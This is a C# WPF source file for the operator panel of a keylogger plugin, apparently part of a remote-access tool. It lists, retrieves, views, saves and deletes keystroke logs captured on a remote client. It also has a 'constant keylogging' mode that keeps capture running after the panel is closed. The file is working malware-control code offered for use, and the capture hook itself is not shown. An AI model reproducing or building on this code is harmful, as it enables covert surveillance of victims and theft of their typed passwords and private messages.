using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.Versioning;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Effects;
using System.Windows.Shapes;
using System.Windows.Threading;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class KeyloggerUI : UserControl, IDisposable
    {
        private static Color C(string key) => (Color)Application.Current.Resources[key];
        private static SolidColorBrush B(string key) => (SolidColorBrush)Application.Current.Resources[key];

        private readonly PluginHost _host;
        private readonly KeyloggerPlugin _plugin;
        private PluginContext _context;

        Color BgDarkColor => C("BackgroundColor");
        Color BgMediumColor => C("SurfaceColor");
        Color BgElevatedColor => C("SurfaceLightColor");
        Color BorderColorVal => C("BorderColor");
        Color BorderSubtleColor => C("BorderColor");
        Color TextPrimaryColor => C("TextPrimaryColor");
        Color TextSecondaryColor => C("TextSecondaryColor");
        Color TextMutedColor => C("TextSecondaryColor");
        Color AccentBlueColor => C("PrimaryColor");
        Color AccentBlueHoverColor => C("PrimaryHoverColor");
        Color AccentGreenColor => C("SuccessColor");
        Color AccentGreenHoverColor => C("SuccessHoverColor");
        Color AccentRedColor => C("DangerColor");
        Color AccentRedHoverColor => C("DangerHoverColor");
        Color AccentOrangeColor => C("WarningColor");
        Color AccentPurpleColor => C("PrimaryColor");
        Color SwitchOnColor => C("SuccessColor");
        Color SwitchOffColor => C("ButtonBgColor");
        Color DisabledBgColor => C("ButtonBgColor");
        Color HoverItemColor => C("BorderColor");
        Color ButtonBorderClr => C("ButtonBorderColor");
        Color ButtonBgClr => C("ButtonBgColor");
        Color ButtonBgHoverClr => C("ButtonBgHoverColor");

        SolidColorBrush BgDarkBrush => B("BackgroundBrush");
        SolidColorBrush BgMediumBrush => B("SurfaceBrush");
        SolidColorBrush FgPrimary => B("TextPrimaryBrush");
        SolidColorBrush FgSecondary => B("TextSecondaryBrush");
        SolidColorBrush FgMuted => B("TextSecondaryBrush");
        SolidColorBrush BorderBrushTheme => B("BorderBrush");
        SolidColorBrush BorderSubtleBrush => B("BorderBrush");
        SolidColorBrush AccentBlueBrush => B("PrimaryBrush");
        SolidColorBrush AccentGreenBrush => B("SuccessBrush");
        SolidColorBrush AccentOrangeBrush => B("WarningBrush");
        SolidColorBrush DisabledBgBrush => B("ButtonBgBrush");

        // Controls
        private readonly ListBox _fileList;
        private readonly WebBrowser _logViewer;
        private readonly TextBlock _statusText;
        private readonly TextBlock _statusIcon;
        private Border _persistentSwitchTrack;
        private Border _persistentSwitchThumb;
        private TextBlock _persistentLabel;
        private readonly TextBlock _fileCountBadge;
        private readonly TextBlock _viewerPlaceholder;
        private bool _persistentEnabled;

        // State
        private bool _disposed;
        public bool IsDisposed => _disposed;
        private readonly List<LogFileInfo> _logFiles = new();
        private string _currentHtml = "";
        private string _currentFileName = "";

        private class LogFileInfo
        {
            public string Name { get; set; }
            public long Size { get; set; }
            public DateTime LastWrite { get; set; }

            public static string FormatSize(long b)
            {
                if (b < 1024) return $"{b} B";
                if (b < 1024 * 1024) return $"{b / 1024.0:F1} KB";
                return $"{b / (1024.0 * 1024):F1} MB";
            }
        }

        /// <summary>
        /// Reattach to a new context when the tab is reopened while persistent mode kept us alive
        /// </summary>
        public void Reattach(PluginContext newContext)
        {
            _context = newContext;
            SetStatus("Reconnected to keylogger session", true);
            RequestFileList();
        }

        public KeyloggerUI(PluginContext context, PluginHost host, KeyloggerPlugin plugin)
        {
            _context = context;
            _host = host;
            _plugin = plugin;
            _persistentEnabled = _plugin.IsPersistentKeylogEnabled(_context.ClientId);

            var root = new Grid { Background = BgDarkBrush };
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            root.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            root.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            // ===== TOOLBAR =====
            var toolbarBorder = new Border
            {
                Background = BgMediumBrush,
                BorderBrush = BorderSubtleBrush,
                BorderThickness = new Thickness(0, 0, 0, 1),
                Padding = new Thickness(10, 6, 10, 6)
            };
            var toolbar = new DockPanel { LastChildFill = false };

            var leftButtons = new StackPanel { Orientation = Orientation.Horizontal };

            var refreshBtn = MakeThemedButton("Refresh", AccentGreenColor, AccentGreenHoverColor);
            refreshBtn.Click += (s, e) => RequestFileList();

            var viewBtn = MakeThemedButton("View", AccentBlueColor, AccentBlueHoverColor);
            viewBtn.Click += (s, e) => ViewSelected();

            var saveBtn = MakeThemedButton("Save", ButtonBgClr, ButtonBgHoverClr);
            saveBtn.Click += (s, e) => SaveCurrentLog();

            var flushBtn = MakeThemedButton("Flush", AccentOrangeColor, C("WarningColor"));
            flushBtn.Click += (s, e) => FlushNow();

            var statusBtn = MakeThemedButton("Status", C("PrimaryColor"), C("PrimaryHoverColor"));
            statusBtn.Click += (s, e) => RequestStatus();

            leftButtons.Children.Add(refreshBtn);
            leftButtons.Children.Add(viewBtn);
            leftButtons.Children.Add(saveBtn);
            leftButtons.Children.Add(MakeSeparator());
            leftButtons.Children.Add(flushBtn);
            leftButtons.Children.Add(statusBtn);

            DockPanel.SetDock(leftButtons, Dock.Left);
            toolbar.Children.Add(leftButtons);

            var rightButtons = new StackPanel { Orientation = Orientation.Horizontal };

            var deleteBtn = MakeThemedButton("Delete", AccentRedColor, AccentRedHoverColor);
            deleteBtn.Click += (s, e) => DeleteSelected();

            var deleteAllBtn = MakeThemedButton("Delete All", AccentRedColor, AccentRedHoverColor);
            deleteAllBtn.Click += (s, e) => DeleteAll();

            rightButtons.Children.Add(deleteBtn);
            rightButtons.Children.Add(deleteAllBtn);

            DockPanel.SetDock(rightButtons, Dock.Right);
            toolbar.Children.Add(rightButtons);

            toolbarBorder.Child = toolbar;
            Grid.SetRow(toolbarBorder, 0);
            root.Children.Add(toolbarBorder);

            // ===== CONTENT =====
            var contentGrid = new Grid();
            contentGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(260) });
            contentGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });
            contentGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) });

            // Left panel: file list
            var listPanel = new Grid { Background = BgMediumBrush };
            listPanel.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            listPanel.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });

            var listHeader = new Border
            {
                Background = new SolidColorBrush(C("SurfaceLightColor")),
                BorderBrush = BorderSubtleBrush,
                BorderThickness = new Thickness(0, 0, 0, 1),
                Padding = new Thickness(12, 8, 12, 8)
            };
            var listHeaderPanel = new StackPanel { Orientation = Orientation.Horizontal };
            listHeaderPanel.Children.Add(new TextBlock
            {
                Text = "Log Files",
                FontSize = 12,
                FontWeight = FontWeights.SemiBold,
                Foreground = FgSecondary,
                VerticalAlignment = VerticalAlignment.Center
            });

            _fileCountBadge = new TextBlock
            {
                Text = "0",
                FontSize = 10,
                FontWeight = FontWeights.Bold,
                Foreground = FgPrimary,
                Background = new SolidColorBrush(C("BorderColor")),
                Padding = new Thickness(6, 2, 6, 2),
                Margin = new Thickness(8, 0, 0, 0),
                VerticalAlignment = VerticalAlignment.Center
            };
            listHeaderPanel.Children.Add(_fileCountBadge);

            listHeader.Child = listHeaderPanel;
            Grid.SetRow(listHeader, 0);
            listPanel.Children.Add(listHeader);

            _fileList = new ListBox
            {
                Background = Brushes.Transparent,
                Foreground = FgPrimary,
                BorderThickness = new Thickness(0),
                FontFamily = new FontFamily("Cascadia Code, Cascadia Mono, Consolas, monospace"),
                FontSize = 11.5,
                Padding = new Thickness(4),
                Margin = new Thickness(0),
                Style = null
            };
            _fileList.MouseDoubleClick += (s, e) => ViewSelected();
            Grid.SetRow(_fileList, 1);
            listPanel.Children.Add(_fileList);

            var listBorder = new Border
            {
                BorderBrush = BorderSubtleBrush,
                BorderThickness = new Thickness(0, 0, 1, 0),
                Child = listPanel
            };
            Grid.SetColumn(listBorder, 0);
            contentGrid.Children.Add(listBorder);

            var splitter = new GridSplitter
            {
                Width = 3,
                Background = new SolidColorBrush(BorderSubtleColor),
                HorizontalAlignment = HorizontalAlignment.Center,
                VerticalAlignment = VerticalAlignment.Stretch,
                ResizeBehavior = GridResizeBehavior.PreviousAndNext
            };
            Grid.SetColumn(splitter, 1);
            contentGrid.Children.Add(splitter);

            // Right panel: viewer
            var viewerContainer = new Grid { Background = BgDarkBrush };

            _viewerPlaceholder = new TextBlock
            {
                Text = "Select a log file and click View to display its contents",
                FontSize = 13,
                Foreground = FgMuted,
                HorizontalAlignment = HorizontalAlignment.Center,
                VerticalAlignment = VerticalAlignment.Center,
                FontStyle = FontStyles.Italic
            };
            viewerContainer.Children.Add(_viewerPlaceholder);

            _logViewer = new WebBrowser { Visibility = Visibility.Collapsed };
            viewerContainer.Children.Add(_logViewer);

            Grid.SetColumn(viewerContainer, 2);
            contentGrid.Children.Add(viewerContainer);

            Grid.SetRow(contentGrid, 1);
            root.Children.Add(contentGrid);

            // ===== STATUS BAR =====
            var statusBorder = new Border
            {
                Background = new SolidColorBrush(C("BackgroundColor")),
                BorderBrush = BorderSubtleBrush,
                BorderThickness = new Thickness(0, 1, 0, 0),
                Padding = new Thickness(14, 6, 14, 6)
            };
            var statusPanel = new StackPanel { Orientation = Orientation.Horizontal };

            _statusIcon = new TextBlock
            {
                Text = "?",
                FontSize = 9,
                Foreground = AccentGreenBrush,
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(0, 1, 6, 0)
            };
            statusPanel.Children.Add(_statusIcon);

            _statusText = new TextBlock
            {
                Text = "Initializing...",
                Foreground = FgSecondary,
                FontSize = 11.5,
                VerticalAlignment = VerticalAlignment.Center,
                FontFamily = new FontFamily("Segoe UI, sans-serif")
            };
            statusPanel.Children.Add(_statusText);

            statusBorder.Child = statusPanel;
            Grid.SetRow(statusBorder, 2);
            root.Children.Add(statusBorder);

            this.Content = root;
            this.Background = BgDarkBrush;

            UpdateToggleSwitchVisual();
            RequestFileList();
        }

        // ==================== TOGGLE SWITCH ====================

        private Border CreateToggleSwitch()
        {
            var container = new Border
            {
                Width = 42,
                Height = 22,
                CornerRadius = new CornerRadius(11),
                Cursor = Cursors.Hand,
                SnapsToDevicePixels = true
            };

            var innerGrid = new Grid();

            _persistentSwitchTrack = new Border
            {
                CornerRadius = new CornerRadius(11),
                Background = _persistentEnabled
                    ? new SolidColorBrush(SwitchOnColor)
                    : new SolidColorBrush(SwitchOffColor)
            };
            innerGrid.Children.Add(_persistentSwitchTrack);

            _persistentSwitchThumb = new Border
            {
                Width = 16,
                Height = 16,
                CornerRadius = new CornerRadius(8),
                Background = new SolidColorBrush(C("SurfaceLightColor")),
                HorizontalAlignment = _persistentEnabled ? HorizontalAlignment.Right : HorizontalAlignment.Left,
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(3),
                Effect = new DropShadowEffect
                {
                    BlurRadius = 3,
                    ShadowDepth = 1,
                    Opacity = 0.3,
                    Color = Colors.Black
                }
            };
            innerGrid.Children.Add(_persistentSwitchThumb);

            container.Child = innerGrid;
            container.MouseLeftButtonDown += ToggleSwitch_Click;

            return container;
        }

        private void ToggleSwitch_Click(object sender, MouseButtonEventArgs e)
        {
            _persistentEnabled = !_persistentEnabled;
            _plugin.SetPersistentKeylog(_context.ClientId, _persistentEnabled);
            UpdateToggleSwitchVisual();

            if (_persistentEnabled)
            {
                SetStatus("Constant keylogging enabled ? plugin stays running when tab is closed", true);
            }
            else
            {
                SetStatus("Constant keylogging disabled ? plugin stops when tab is closed", false);
            }
        }

        private void UpdateToggleSwitchVisual()
        {
            if (_persistentSwitchTrack == null || _persistentSwitchThumb == null) return;

            _persistentSwitchTrack.Background = _persistentEnabled
                ? new SolidColorBrush(SwitchOnColor)
                : new SolidColorBrush(SwitchOffColor);

            _persistentSwitchThumb.HorizontalAlignment = _persistentEnabled
                ? HorizontalAlignment.Right
                : HorizontalAlignment.Left;

            if (_persistentLabel != null)
            {
                _persistentLabel.Foreground = _persistentEnabled ? AccentGreenBrush : FgSecondary;
            }
        }

        // ==================== FILE LIST ITEM ====================

        private Border CreateFileListItem(LogFileInfo info, int index)
        {
            var itemBorder = new Border
            {
                Background = Brushes.Transparent,
                CornerRadius = new CornerRadius(4),
                Padding = new Thickness(10, 7, 10, 7),
                Margin = new Thickness(2, 1, 2, 1),
                Cursor = Cursors.Hand,
                Tag = index
            };

            var itemGrid = new Grid();
            itemGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            itemGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            var nameText = new TextBlock
            {
                Text = info.Name,
                FontSize = 12,
                FontWeight = FontWeights.Medium,
                Foreground = FgPrimary,
                TextTrimming = TextTrimming.CharacterEllipsis
            };
            Grid.SetRow(nameText, 0);
            itemGrid.Children.Add(nameText);

            var detailsPanel = new StackPanel
            {
                Orientation = Orientation.Horizontal,
                Margin = new Thickness(0, 2, 0, 0)
            };

            detailsPanel.Children.Add(new TextBlock
            {
                Text = LogFileInfo.FormatSize(info.Size),
                FontSize = 10.5,
                Foreground = FgMuted,
                Margin = new Thickness(0, 0, 10, 0)
            });

            if (info.LastWrite > DateTime.MinValue)
            {
                detailsPanel.Children.Add(new TextBlock
                {
                    Text = info.LastWrite.ToString("MMM dd, HH:mm"),
                    FontSize = 10.5,
                    Foreground = FgMuted
                });
            }

            Grid.SetRow(detailsPanel, 1);
            itemGrid.Children.Add(detailsPanel);

            itemBorder.Child = itemGrid;

            itemBorder.MouseEnter += (s, e) =>
            {
                if (_fileList.SelectedIndex != index)
                    itemBorder.Background = new SolidColorBrush(HoverItemColor);
            };
            itemBorder.MouseLeave += (s, e) =>
            {
                if (_fileList.SelectedIndex != index)
                    itemBorder.Background = Brushes.Transparent;
            };

            return itemBorder;
        }

        // ==================== THEMED HELPERS ====================

        private Button MakeThemedButton(string text, Color normalBg, Color hoverBg)
        {
            var normalBrush = new SolidColorBrush(normalBg);
            var hoverBrush = new SolidColorBrush(hoverBg);
            var borderBrush = new SolidColorBrush(C("ButtonBorderColor"));
            var disabledBg = new SolidColorBrush(C("ButtonBgHoverColor"));

            var template = new ControlTemplate(typeof(Button));
            var border = new FrameworkElementFactory(typeof(Border), "bd");
            border.SetValue(Border.BackgroundProperty, normalBrush);
            border.SetValue(Border.BorderBrushProperty, borderBrush);
            border.SetValue(Border.BorderThicknessProperty, new Thickness(1));
            border.SetValue(Border.CornerRadiusProperty, new CornerRadius(3));
            border.SetValue(Border.PaddingProperty, new Thickness(8, 4, 8, 4));
            border.SetValue(Border.SnapsToDevicePixelsProperty, true);

            var cp = new FrameworkElementFactory(typeof(ContentPresenter), "cp");
            cp.SetValue(ContentPresenter.HorizontalAlignmentProperty, HorizontalAlignment.Center);
            cp.SetValue(ContentPresenter.VerticalAlignmentProperty, VerticalAlignment.Center);
            border.AppendChild(cp);
            template.VisualTree = border;

            var hover = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true };
            hover.Setters.Add(new Setter(Border.BackgroundProperty, hoverBrush, "bd"));
            template.Triggers.Add(hover);

            var pressed = new Trigger { Property = ButtonBase.IsPressedProperty, Value = true };
            pressed.Setters.Add(new Setter(Border.BackgroundProperty, hoverBrush, "bd"));
            pressed.Setters.Add(new Setter(UIElement.OpacityProperty, 0.85, "bd"));
            template.Triggers.Add(pressed);

            var disabled = new Trigger { Property = UIElement.IsEnabledProperty, Value = false };
            disabled.Setters.Add(new Setter(Border.BackgroundProperty, disabledBg, "bd"));
            disabled.Setters.Add(new Setter(ContentPresenter.OpacityProperty, 0.4, "cp"));
            template.Triggers.Add(disabled);

            return new Button
            {
                Content = text,
                Template = template,
                Foreground = FgPrimary,
                Cursor = Cursors.Hand,
                Margin = new Thickness(2),
                FontSize = 12,
                FontWeight = FontWeights.SemiBold
            };
        }

        private Border MakeSeparator() => new Border
        {
            Width = 1,
            Background = new SolidColorBrush(C("ButtonBorderColor")),
            Margin = new Thickness(4, 2, 4, 2)
        };

        private void SetStatus(string t, bool? isSuccess = null)
        {
            Dispatcher.BeginInvoke(() =>
            {
                _statusText.Text = t;
                if (isSuccess == true)
                    _statusIcon.Foreground = AccentGreenBrush;
                else if (isSuccess == false)
                    _statusIcon.Foreground = AccentOrangeBrush;
                else
                    _statusIcon.Foreground = AccentBlueBrush;
            });
        }

        private void SetStatusError(string t)
        {
            Dispatcher.BeginInvoke(() =>
            {
                _statusText.Text = t;
                _statusIcon.Foreground = new SolidColorBrush(AccentRedColor);
            });
        }

        // ==================== COMMANDS ====================

        private async void RequestFileList()
        {
            try
            {
                await _context.SendToClient(new byte[] { 0x01 });
                SetStatus("Requesting log files...");
            }
            catch (Exception ex) { SetStatusError($"Send failed: {ex.Message}"); }
        }

        private async void RequestStatus()
        {
            try
            {
                await _context.SendToClient(new byte[] { 0x06 });
                SetStatus("Requesting status...");
            }
            catch (Exception ex) { SetStatusError($"Send failed: {ex.Message}"); }
        }

        private async void ViewSelected()
        {
            if (_fileList.SelectedItem == null) { SetStatus("Select a file to view"); return; }
            int idx = _fileList.SelectedIndex;
            if (idx < 0 || idx >= _logFiles.Count) return;

            string name = _logFiles[idx].Name;
            byte[] nameBytes = Encoding.UTF8.GetBytes(name);
            byte[] msg = new byte[nameBytes.Length + 1];
            msg[0] = 0x02;
            Buffer.BlockCopy(nameBytes, 0, msg, 1, nameBytes.Length);
            try
            {
                await _context.SendToClient(msg);
                SetStatus($"Loading {name}...");
            }
            catch (Exception ex) { SetStatusError($"Send failed: {ex.Message}"); }
        }

        private async void DeleteSelected()
        {
            if (_fileList.SelectedItem == null) { SetStatus("Select a file to delete"); return; }
            int idx = _fileList.SelectedIndex;
            if (idx < 0 || idx >= _logFiles.Count) return;

            string name = _logFiles[idx].Name;
            byte[] nameBytes = Encoding.UTF8.GetBytes(name);
            byte[] msg = new byte[nameBytes.Length + 1];
            msg[0] = 0x03;
            Buffer.BlockCopy(nameBytes, 0, msg, 1, nameBytes.Length);
            try
            {
                await _context.SendToClient(msg);
                SetStatus($"Deleting {name}...");
            }
            catch (Exception ex) { SetStatusError($"Send failed: {ex.Message}"); }
        }

        private async void DeleteAll()
        {
            try
            {
                await _context.SendToClient(new byte[] { 0x04 });
                SetStatus("Deleting all log files...");
            }
            catch (Exception ex) { SetStatusError($"Send failed: {ex.Message}"); }
        }

        private async void FlushNow()
        {
            try
            {
                await _context.SendToClient(new byte[] { 0x05 });
                SetStatus("Flushing buffer to disk...");
            }
            catch (Exception ex) { SetStatusError($"Send failed: {ex.Message}"); }
        }

        private void SaveCurrentLog()
        {
            if (string.IsNullOrEmpty(_currentHtml)) { SetStatus("No log loaded to save"); return; }

            var dlg = new Microsoft.Win32.SaveFileDialog
            {
                Title = "Save Keylog",
                FileName = string.IsNullOrEmpty(_currentFileName)
                    ? $"keylog_{DateTime.Now:yyyyMMdd_HHmmss}.html"
                    : _currentFileName + ".html",
                Filter = "HTML files (*.html)|*.html|All files (*.*)|*.*"
            };
            if (dlg.ShowDialog() != true) return;

            try
            {
                File.WriteAllText(dlg.FileName, _currentHtml, Encoding.UTF8);
                SetStatus($"Saved to {System.IO.Path.GetFileName(dlg.FileName)}", true);
            }
            catch (Exception ex) { SetStatusError($"Save failed: {ex.Message}"); }
        }

        // ==================== DATA HANDLING ====================

        public void HandleServerData(byte[] data)
        {
            if (_disposed || data == null || data.Length == 0) return;
            byte msgType = data[0];

            Dispatcher.BeginInvoke(() =>
            {
                try
                {
                    switch (msgType)
                    {
                        case 0x10:
                            ParseFileList(data);
                            break;

                        case 0x11:
                            ParseFileContent(data);
                            break;

                        case 0xFE:
                            if (data.Length > 1)
                                SetStatus(Encoding.UTF8.GetString(data, 1, data.Length - 1), true);
                            break;

                        case 0xFF:
                            if (data.Length > 1)
                                SetStatusError("Error: " + Encoding.UTF8.GetString(data, 1, data.Length - 1));
                            break;
                    }
                }
                catch (Exception ex) { SetStatusError($"Parse error: {ex.Message}"); }
            });
        }

        private void ParseFileList(byte[] data)
        {
            try
            {
                using var ms = new MemoryStream(data, 1, data.Length - 1);
                using var br = new BinaryReader(ms, Encoding.UTF8);

                int count = br.ReadInt32();
                _logFiles.Clear();
                _fileList.Items.Clear();

                for (int i = 0; i < count; i++)
                {
                    string name = br.ReadString();
                    long size = br.ReadInt64();
                    long ticks = br.ReadInt64();

                    var info = new LogFileInfo
                    {
                        Name = name,
                        Size = size,
                        LastWrite = ticks > 0 ? new DateTime(ticks, DateTimeKind.Utc) : DateTime.MinValue
                    };
                    _logFiles.Add(info);

                    var item = CreateFileListItem(info, i);
                    _fileList.Items.Add(item);
                }

                _fileCountBadge.Text = count.ToString();
                SetStatus($"{count} log file{(count != 1 ? "s" : "")} found", true);
            }
            catch (Exception ex) { SetStatusError($"Parse error: {ex.Message}"); }
        }

        private void ParseFileContent(byte[] data)
        {
            try
            {
                if (data.Length < 4) return;

                int nameLen = data[1] | (data[2] << 8);
                if (data.Length < 3 + nameLen) return;

                _currentFileName = Encoding.UTF8.GetString(data, 3, nameLen);
                int contentOffset = 3 + nameLen;
                _currentHtml = Encoding.UTF8.GetString(data, contentOffset, data.Length - contentOffset);

                _viewerPlaceholder.Visibility = Visibility.Collapsed;
                _logViewer.Visibility = Visibility.Visible;
                _logViewer.NavigateToString(_currentHtml);
                SetStatus($"Viewing: {_currentFileName}  ({_currentHtml.Length:N0} chars)", true);
            }
            catch (Exception ex) { SetStatusError($"View error: {ex.Message}"); }
        }

        public void Dispose()
        {
            _disposed = true;
        }
    }
}
